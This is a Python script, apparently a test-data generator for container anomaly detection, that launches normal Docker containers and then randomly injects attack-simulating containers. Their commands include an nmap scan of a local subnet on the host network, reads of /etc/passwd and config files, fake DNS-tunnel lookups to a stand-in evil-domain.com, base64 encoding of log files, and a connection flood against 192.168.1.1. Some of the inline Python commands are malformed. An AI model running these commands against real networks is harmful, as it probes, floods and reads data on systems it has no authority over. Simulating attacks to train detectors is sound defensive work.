import docker
import subprocess
import time
import random
import threading
import logging
import sys
import json
import os
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any
import argparse

# 确保日志目录存在
Path('injection_logs').mkdir(exist_ok=True)

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('injection_logs/anomaly_injection.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class ContainerAnomalyInjector:
    """容器异常注入器"""
    
    def __init__(self):
        self.docker_client = docker.from_env()
        self.injection_history = []
        self.running_containers = {}
        self.normal_containers = {}
        self.anomaly_containers = {}
        
        # 确保日志目录存在
        Path('injection_logs').mkdir(exist_ok=True)
        
        # 加载现有的注入历史
        self.load_injection_history()
        
    def load_injection_history(self):
        """加载现有的注入历史"""
        try:
            history_file = Path('injection_logs/injection_history.json')
            if history_file.exists():
                with open(history_file, 'r') as f:
                    self.injection_history = json.load(f)
                logger.info(f"加载了 {len(self.injection_history)} 条注入历史记录")
        except Exception as e:
            logger.warning(f"加载注入历史失败: {e}")
            self.injection_history = []
        
    def log_injection(self, container_name: str, anomaly_type: str, description: str, severity: str):
        """记录异常注入"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'container_name': container_name,
            'anomaly_type': anomaly_type,
            'description': description,
            'severity': severity
        }
        self.injection_history.append(log_entry)
        logger.info(f"注入异常 [{severity}] {container_name}: {anomaly_type} - {description}")
        
        # 保存到文件
        try:
            # 确保目录存在
            Path('injection_logs').mkdir(exist_ok=True)
            with open('injection_logs/injection_history.json', 'w') as f:
                json.dump(self.injection_history, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"保存注入历史失败: {e}")
    
    def create_normal_containers(self, count: int = 8):
        """创建正常运行的容器"""
        normal_scenarios = [
            {
                'name': 'web-server',
                'image': 'nginx:latest',
                'command': None,
                'description': '正常的Web服务器'
            },
            {
                'name': 'database',
                'image': 'mysql:latest',
                'command': None,
                'environment': ['MYSQL_ROOT_PASSWORD=password123'],
                'description': '正常的数据库服务'
            },
            {
                'name': 'cache-server',
                'image': 'redis:latest',
                'command': None,
                'description': '正常的缓存服务'
            },
            {
                'name': 'api-service',
                'image': 'python:3.11',
                'command': 'python -c "import time; import http.server; import socketserver; handler = http.server.SimpleHTTPRequestHandler; httpd = socketserver.TCPServer((\'\', 8000), handler); httpd.serve_forever()"',
                'description': '正常的API服务'
            },
            {
                'name': 'monitor-service',
                'image': 'alpine:latest',
                'command': 'sh -c "while true; do echo $(date): System monitoring...; sleep 60; done"',
                'description': '正常的监控服务'
            },
            {
                'name': 'log-processor',
                'image': 'busybox:latest',
                'command': 'sh -c "while true; do echo Processing logs...; sleep 30; done"',
                'description': '正常的日志处理服务'
            },
            {
                'name': 'backup-service',
                'image': 'ubuntu:latest',
                'command': 'bash -c "while true; do echo Backup running...; sleep 300; done"',
                'description': '正常的备份服务'
            },
            {
                'name': 'file-service',
                'image': 'httpd:latest',
                'command': None,
                'description': '正常的文件服务'
            }
        ]
        
        created_count = 0
        for i in range(min(count, len(normal_scenarios))):
            scenario = normal_scenarios[i]
            try:
                container_name = f"{scenario['name']}-normal-{i+1}"
                
                # 准备容器参数
                container_params = {
                    'image': scenario['image'],
                    'name': container_name,
                    'detach': True,
                    'remove': True
                }
                
                if scenario.get('command'):
                    container_params['command'] = scenario['command']
                
                if scenario.get('environment'):
                    container_params['environment'] = scenario['environment']
                
                container = self.docker_client.containers.run(**container_params)
                
                self.normal_containers[container_name] = {
                    'container': container,
                    'scenario': scenario,
                    'start_time': datetime.now()
                }
                
                logger.info(f"✅ 创建正常容器: {container_name} - {scenario['description']}")
                created_count += 1
                time.sleep(2)  # 避免创建过快
                
            except Exception as e:
                logger.error(f"❌ 创建正常容器失败 {scenario['name']}: {e}")
        
        logger.info(f"正常容器创建完成: {created_count}/{count}")
        return created_count
    
    def inject_cpu_intensive_anomaly(self):
        """注入CPU密集型异常"""
        container_name = f"cpu-bomb-{random.randint(1000, 9999)}"
        
        try:
            # 创建消耗大量CPU的容器
            container = self.docker_client.containers.run(
                image='python:3.11',
                name=container_name,
                command='python -c "import threading; import time; def cpu_intensive(): [x*x for x in range(10000000) for _ in range(100)]; [threading.Thread(target=cpu_intensive).start() for _ in range(8)]"',
                detach=True,
                remove=True,
                mem_limit='1g',
                cpu_count=4
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name, 
                "CPU_INTENSIVE", 
                "恶意挖矿程序或计算密集型攻击，消耗大量CPU资源", 
                "HIGH"
            )
            
        except Exception as e:
            logger.error(f"CPU密集型异常注入失败: {e}")
    
    def inject_memory_leak_anomaly(self):
        """注入内存泄漏异常"""
        container_name = f"memory-leak-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='python:3.11',
                name=container_name,
                command='python -c "import time; data = []; [data.extend(range(1000000)) for _ in range(1000)]"',
                detach=True,
                remove=True,
                mem_limit='2g'
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "MEMORY_LEAK",
                "应用程序内存泄漏，持续消耗内存资源",
                "HIGH"
            )
            
        except Exception as e:
            logger.error(f"内存泄漏异常注入失败: {e}")
    
    def inject_network_scanning_anomaly(self):
        """注入网络扫描异常"""
        container_name = f"network-scanner-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='alpine:latest',
                name=container_name,
                command='sh -c "apk add --no-cache nmap; while true; do nmap -sS -O 192.168.1.0/24; sleep 30; done"',
                detach=True,
                remove=True,
                network_mode='host'
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "NETWORK_SCANNING",
                "恶意网络扫描，探测内网主机和端口",
                "CRITICAL"
            )
            
        except Exception as e:
            logger.error(f"网络扫描异常注入失败: {e}")
    
    def inject_privilege_escalation_anomaly(self):
        """注入权限提升异常"""
        container_name = f"privilege-escalation-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='ubuntu:latest',
                name=container_name,
                command='bash -c "while true; do find /etc -name passwd -exec cat {} \\;; find /root -type f 2>/dev/null; sudo -l 2>/dev/null; sleep 60; done"',
                detach=True,
                remove=True,
                privileged=False
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "PRIVILEGE_ESCALATION",
                "尝试权限提升，访问敏感系统文件",
                "CRITICAL"
            )
            
        except Exception as e:
            logger.error(f"权限提升异常注入失败: {e}")
    
    def inject_file_system_anomaly(self):
        """注入文件系统异常"""
        container_name = f"file-system-attack-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='busybox:latest',
                name=container_name,
                command='sh -c "while true; do dd if=/dev/zero of=/tmp/large_file bs=1M count=100; rm -f /tmp/large_file; find / -name \"*.conf\" -exec cat {} \\; 2>/dev/null; sleep 30; done"',
                detach=True,
                remove=True
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "FILE_SYSTEM_ABUSE",
                "异常文件操作，大量读写和配置文件访问",
                "MEDIUM"
            )
            
        except Exception as e:
            logger.error(f"文件系统异常注入失败: {e}")
    
    def inject_dns_tunneling_anomaly(self):
        """注入DNS隧道异常"""
        container_name = f"dns-tunnel-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='alpine:latest',
                name=container_name,
                command='sh -c "while true; do for i in $(seq 1 100); do nslookup $(head /dev/urandom | tr -dc a-z0-9 | head -c 32).evil-domain.com 8.8.8.8; done; sleep 10; done"',
                detach=True,
                remove=True
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "DNS_TUNNELING",
                "DNS隧道通信，用于数据泄露或命令控制",
                "HIGH"
            )
            
        except Exception as e:
            logger.error(f"DNS隧道异常注入失败: {e}")
    
    def inject_crypto_mining_anomaly(self):
        """注入加密货币挖矿异常"""
        container_name = f"crypto-miner-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='python:3.11',
                name=container_name,
                command='python -c "import hashlib; import time; import multiprocessing; def mine(): target=\'0000\'; nonce=0; while True: data=f\'block{nonce}\'; hash_result=hashlib.sha256(data.encode()).hexdigest(); nonce+=1; if hash_result.startswith(target): print(f\'Found: {hash_result}\'); time.sleep(0.001); [multiprocessing.Process(target=mine).start() for _ in range(multiprocessing.cpu_count())]"',
                detach=True,
                remove=True,
                cpu_count=4
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "CRYPTO_MINING",
                "非法加密货币挖矿程序，消耗计算资源",
                "HIGH"
            )
            
        except Exception as e:
            logger.error(f"加密货币挖矿异常注入失败: {e}")
    
    def inject_ddos_anomaly(self):
        """注入DDoS攻击异常"""
        container_name = f"ddos-attacker-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='python:3.11-alpine',
                name=container_name,
                command='python -c "import socket; import threading; import time; def flood(): s=socket.socket(); s.settimeout(1); [s.connect_ex((\'192.168.1.1\', 80)) for _ in range(1000)]; s.close(); [threading.Thread(target=flood).start() for _ in range(50)]"',
                detach=True,
                remove=True
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "DDOS_ATTACK",
                "分布式拒绝服务攻击，大量网络连接",
                "CRITICAL"
            )
            
        except Exception as e:
            logger.error(f"DDoS攻击异常注入失败: {e}")
    
    def inject_data_exfiltration_anomaly(self):
        """注入数据泄露异常"""
        container_name = f"data-exfil-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='alpine:latest',
                name=container_name,
                command='sh -c "while true; do find /etc /var/log -type f -exec head -10 {} \\; 2>/dev/null | base64 | head -100; sleep 60; done"',
                detach=True,
                remove=True
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "DATA_EXFILTRATION",
                "敏感数据泄露，读取并编码系统文件",
                "CRITICAL"
            )
            
        except Exception as e:
            logger.error(f"数据泄露异常注入失败: {e}")
    
    def inject_process_injection_anomaly(self):
        """注入进程注入异常"""
        container_name = f"process-injection-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='ubuntu:latest',
                name=container_name,
                command='bash -c "while true; do ps aux | grep -v grep; for pid in $(ps -eo pid --no-headers | head -5); do kill -USR1 $pid 2>/dev/null; done; sleep 30; done"',
                detach=True,
                remove=True
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "PROCESS_INJECTION",
                "进程注入攻击，向其他进程发送信号",
                "HIGH"
            )
            
        except Exception as e:
            logger.error(f"进程注入异常注入失败: {e}")
    
    def inject_suspicious_network_anomaly(self):
        """注入可疑网络活动异常"""
        container_name = f"suspicious-network-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='python:3.11-alpine',
                name=container_name,
                command='python -c "import socket; import time; import random; ips=[\'1.1.1.1\',\'8.8.8.8\',\'208.67.222.222\']; ports=[80,443,53,22,21,25]; [socket.socket().connect_ex((random.choice(ips), random.choice(ports))) for _ in range(1000)]"',
                detach=True,
                remove=True
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "SUSPICIOUS_NETWORK",
                "异常网络连接模式，频繁连接外部服务",
                "MEDIUM"
            )
            
        except Exception as e:
            logger.error(f"可疑网络活动异常注入失败: {e}")
    
    def inject_resource_exhaustion_anomaly(self):
        """注入资源耗尽异常"""
        container_name = f"resource-exhaustion-{random.randint(1000, 9999)}"
        
        try:
            container = self.docker_client.containers.run(
                image='ubuntu:latest',
                name=container_name,
                command='bash -c "while true; do for i in {1..100}; do (sleep 1000 &); done; dd if=/dev/zero of=/tmp/fill bs=1M count=500 2>/dev/null; sleep 10; done"',
                detach=True,
                remove=True,
                mem_limit='1g'
            )
            
            self.anomaly_containers[container_name] = container
            self.log_injection(
                container_name,
                "RESOURCE_EXHAUSTION",
                "恶意资源耗尽攻击，创建大量进程和文件",
                "HIGH"
            )
            
        except Exception as e:
            logger.error(f"资源耗尽异常注入失败: {e}")
    
    def start_anomaly_injection_schedule(self, duration_minutes: int = 30):
        """启动定时异常注入"""
        anomaly_functions = [
            self.inject_cpu_intensive_anomaly,
            self.inject_memory_leak_anomaly,
            self.inject_network_scanning_anomaly,
            self.inject_privilege_escalation_anomaly,
            self.inject_file_system_anomaly,
            self.inject_dns_tunneling_anomaly,
            self.inject_crypto_mining_anomaly,
            self.inject_ddos_anomaly,
            self.inject_data_exfiltration_anomaly,
            self.inject_process_injection_anomaly,
            self.inject_suspicious_network_anomaly,
            self.inject_resource_exhaustion_anomaly
        ]
        
        end_time = time.time() + (duration_minutes * 60)
        injection_count = 0
        
        logger.info(f"🚀 开始异常注入计划，持续时间: {duration_minutes} 分钟")
        
        while time.time() < end_time:
            try:
                # 随机选择异常类型
                anomaly_func = random.choice(anomaly_functions)
                
                # 执行异常注入
                anomaly_func()
                injection_count += 1
                
                # 随机等待 30-120 秒
                wait_time = random.randint(30, 120)
                logger.info(f"等待 {wait_time} 秒后进行下一次异常注入...")
                time.sleep(wait_time)
                
                # 清理一些已停止的容器
                if injection_count % 5 == 0:
                    self.cleanup_stopped_containers()
                
            except KeyboardInterrupt:
                logger.info("用户中断异常注入")
                break
            except Exception as e:
                logger.error(f"异常注入过程中出错: {e}")
                time.sleep(10)
        
        logger.info(f"异常注入完成，总计注入 {injection_count} 个异常")
    
    def cleanup_stopped_containers(self):
        """清理已停止的容器"""
        try:
            stopped_containers = []
            
            for name, container in list(self.anomaly_containers.items()):
                try:
                    container.reload()
                    if container.status == 'exited':
                        stopped_containers.append(name)
                        del self.anomaly_containers[name]
                except:
                    stopped_containers.append(name)
                    del self.anomaly_containers[name]
            
            if stopped_containers:
                logger.info(f"清理已停止的异常容器: {stopped_containers}")
                
        except Exception as e:
            logger.error(f"清理容器时出错: {e}")
    
    def cleanup_all_containers(self):
        """清理所有创建的容器"""
        logger.info("🧹 开始清理所有容器...")
        
        # 清理正常容器
        for name, info in self.normal_containers.items():
            try:
                container = info['container']
                container.stop(timeout=5)
                logger.info(f"停止正常容器: {name}")
            except Exception as e:
                logger.error(f"停止正常容器失败 {name}: {e}")
        
        # 清理异常容器
        for name, container in self.anomaly_containers.items():
            try:
                container.stop(timeout=5)
                logger.info(f"停止异常容器: {name}")
            except Exception as e:
                logger.error(f"停止异常容器失败 {name}: {e}")
        
        logger.info("✅ 容器清理完成")
    
    def generate_injection_report(self):
        """生成异常注入报告"""
        report_file = f"injection_logs/injection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report = {
            'injection_summary': {
                'total_injections': len(self.injection_history),
                'normal_containers': len(self.normal_containers),
                'anomaly_containers': len(self.anomaly_containers),
                'start_time': self.injection_history[0]['timestamp'] if self.injection_history else None,
                'end_time': self.injection_history[-1]['timestamp'] if self.injection_history else None
            },
            'anomaly_types': {},
            'severity_distribution': {},
            'injection_timeline': self.injection_history
        }
        
        # 统计异常类型
        for injection in self.injection_history:
            anomaly_type = injection['anomaly_type']
            severity = injection['severity']
            
            report['anomaly_types'][anomaly_type] = report['anomaly_types'].get(anomaly_type, 0) + 1
            report['severity_distribution'][severity] = report['severity_distribution'].get(severity, 0) + 1
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        logger.info(f"📊 异常注入报告已生成: {report_file}")
        return report_file

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description='容器异常注入器')
    parser.add_argument('--normal-containers', type=int, default=8, help='正常容器数量')
    parser.add_argument('--duration', type=int, default=30, help='异常注入持续时间(分钟)')
    parser.add_argument('--cleanup-only', action='store_true', help='仅清理容器')
    parser.add_argument('--no-normal', action='store_true', help='不创建正常容器')
    
    args = parser.parse_args()
    
    injector = ContainerAnomalyInjector()
    
    try:
        if args.cleanup_only:
            injector.cleanup_all_containers()
            return
        
        # 创建正常容器
        if not args.no_normal:
            logger.info("创建正常运行的容器...")
            injector.create_normal_containers(args.normal_containers)
            time.sleep(5)
        
        # 开始异常注入
        logger.info("开始异常注入...")
        injector.start_anomaly_injection_schedule(args.duration)
        
        # 生成报告
        injector.generate_injection_report()
        
    except KeyboardInterrupt:
        logger.info("用户中断程序")
    except Exception as e:
        logger.error(f"程序执行出错: {e}")
    finally:
        # 询问是否清理容器
        try:
            response = input("\n是否清理所有创建的容器? (y/n): ")
            if response.lower() in ['y', 'yes']:
                injector.cleanup_all_containers()
        except:
            logger.info("程序退出")

if __name__ == "__main__":
    main()
